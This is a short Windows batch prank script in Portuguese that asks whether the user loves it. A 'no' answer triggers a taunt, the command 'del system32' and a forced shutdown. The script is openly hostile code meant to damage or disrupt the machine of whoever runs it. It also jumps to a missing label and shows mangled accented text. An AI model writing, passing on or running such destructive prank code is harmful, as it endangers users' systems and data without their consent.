@echo off 

color a 
echo Ol�, voc� me ama?(Fale somente com sim/n�o)
set /p input=
if /i %input%==Sim goto amor
if /i %input%==N�o goto odeio
if /i not %input%==Sim,N�o goto 1

:amor
echo Eu te amo tamb�m... Heart...Heart...Heart...
echo Vejo voc� mais tarde
pause
exit

:odeio
echo Mas eu te amo... Choro...Choro...Choro...
echo Eca voc� mereceu isso!
timeout 3
del system32
shutdown -s -t 100